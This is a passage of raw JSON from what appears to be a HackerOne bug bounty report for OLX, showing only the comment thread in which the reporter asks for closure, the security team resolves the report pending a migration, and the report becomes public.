,\u003cbr\u003e\nMohamed\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-26T09:53:15.367Z","updated_at":"2017-02-26T09:53:15.367Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1519439,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update here","markdown_message":"\u003cp\u003eAny update here\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-04T17:51:03.862Z","updated_at":"2017-03-04T17:51:03.862Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1580706,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello ,\nIt's already the 3rd of April and no reply from you. May you please close this report as i really need the reputition?\nThanks,\nMohamed","markdown_message":"\u003cp\u003eHello ,\u003cbr\u003e\nIt\u0026#39;s already the 3rd of April and no reply from you. May you please close this report as i really need the reputition?\u003cbr\u003e\nThanks,\u003cbr\u003e\nMohamed\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-03T15:43:24.243Z","updated_at":"2017-04-03T15:43:24.243Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1582737,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Mohammed,\n\nSince this is going to be migrated in a month, we can close the report and mark it as resolved so you get the reputation now but I ask not to disclose the vulnerability until migration happens.\n\nBest regards,\nJoaquín\n\n","markdown_message":"\u003cp\u003eHey Mohammed,\u003c/p\u003e\n\n\u003cp\u003eSince this is going to be migrated in a month, we can close the report and mark it as resolved so you get the reputation now but I ask not to disclose the vulnerability until migration happens.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJoaquín\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-04T12:45:51.049Z","updated_at":"2017-04-04T12:45:51.049Z","actor":{"username":"joaquin_rinaudo","cleared":false,"url":"/joaquin_rinaudo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/082/536/d33cf1cd7294a47bece9ee43f87d518c7f9872d0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1583546,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello , \nOkay no problem at all you may close the report , and we can disclose it whenever you would like to.\nThanks ,\nMohamed","markdown_message":"\u003cp\u003eHello , \u003cbr\u003e\nOkay no problem at all you may close the report , and we can disclose it whenever you would like to.\u003cbr\u003e\nThanks ,\u003cbr\u003e\nMohamed\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-04T18:44:04.290Z","updated_at":"2017-04-04T18:44:04.290Z","actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1584428,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi,\nI'm closing this. Thanks one more time for the report!\n\n\nRegards,\nGlobal Security Infrastructure Team","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nI\u0026#39;m closing this. Thanks one more time for the report!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nGlobal Security Infrastructure Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T07:47:33.418Z","updated_at":"2017-04-05T07:47:33.418Z","actor":{"username":"bartosz_naumowicz","cleared":false,"url":"/bartosz_naumowicz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mohamedsherif","url":"/mohamedsherif"},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1587418,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-06T16:55:12.583Z","updated_at":"2017-04-06T16:55:12.583Z","first_to_agree":true,"actor":{"username":"mohamedsherif","cleared":false,"url":"/mohamedsherif","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1658335,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-06T16:55:20.299Z","updated_at":"2017-05-06T16:55:20.299Z","actor":{"url":"/olx","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"OLX"}},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}